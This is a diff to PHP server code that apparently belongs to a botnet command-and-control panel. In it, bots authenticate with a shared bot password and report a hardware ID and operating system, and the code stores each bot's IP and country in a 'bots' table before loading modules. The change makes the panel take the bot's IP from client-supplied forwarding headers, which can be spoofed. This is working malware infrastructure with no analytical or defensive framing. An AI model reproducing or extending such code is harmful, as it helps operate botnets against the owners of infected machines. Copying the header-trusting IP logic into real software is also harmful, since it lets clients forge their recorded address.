@@ -19,17 +19,18 @@ if ($_GET && isset($_GET['err']) && isset($_GET['os'])&& isset($_GET['pwd']) && 
 }
 elseif ($_GET && isset($_GET['hwid']) && isset($_GET['os']) && isset($_GET['pwd']) && $_GET['pwd'] == $GLOBALS['bot_pass'])
 {
-	$country = $ip2c->get_country_name($_SERVER['REMOTE_ADDR']);
+	$ip = (empty($_SERVER['HTTP_X_FORWARDED_FOR']) ? (empty($_SERVER['HTTP_CLIENT_IP']) ? $_SERVER['REMOTE_ADDR'] : $_SERVER['HTTP_CLIENT_IP']) : $_SERVER['HTTP_X_FORWARDED_FOR']);
+	$country = $ip2c->get_country_name($ip);
 	$country = (strlen($country) > 0) ? $country : "Unknown";
 	$stmt = db_query("SELECT `id` FROM `bots` WHERE `hwid` = :1", $_GET['hwid']);
 	if ($stmt->rowCount() > 0)
-		db_query("UPDATE `bots` SET `OS` = :2, `IP` = :3, `country` = :4, `date` = CURRENT_TIMESTAMP WHERE `hwid` = :1", $_GET['hwid'], $_GET['os'], $_SERVER['REMOTE_ADDR'], $country);
+		db_query("UPDATE `bots` SET `OS` = :2, `IP` = :3, `country` = :4, `date` = CURRENT_TIMESTAMP WHERE `hwid` = :1", $_GET['hwid'], $_GET['os'], $ip, $country);
 	else
 	{
 		if (isset($_GET['uid']))
-			db_query("INSERT INTO `bots`(`hwid`, `OS`, `IP`, `country`, `uid`) VALUES(:1, :2, :3, :4, :5)", $_GET['hwid'], $_GET['os'], $_SERVER['REMOTE_ADDR'], $country, intval($_GET['uid']));
+			db_query("INSERT INTO `bots`(`hwid`, `OS`, `IP`, `country`, `uid`) VALUES(:1, :2, :3, :4, :5)", $_GET['hwid'], $_GET['os'], $ip, $country, intval($_GET['uid']));
 		else
-			db_query("INSERT INTO `bots`(`hwid`, `OS`, `IP`, `country`) VALUES(:1, :2, :3, :4)", $_GET['hwid'], $_GET['os'], $_SERVER['REMOTE_ADDR'], $country);
+			db_query("INSERT INTO `bots`(`hwid`, `OS`, `IP`, `country`) VALUES(:1, :2, :3, :4)", $_GET['hwid'], $_GET['os'], $ip, $country);
 	}
 	// module
 	foreach (scandir('modules') as $mod)
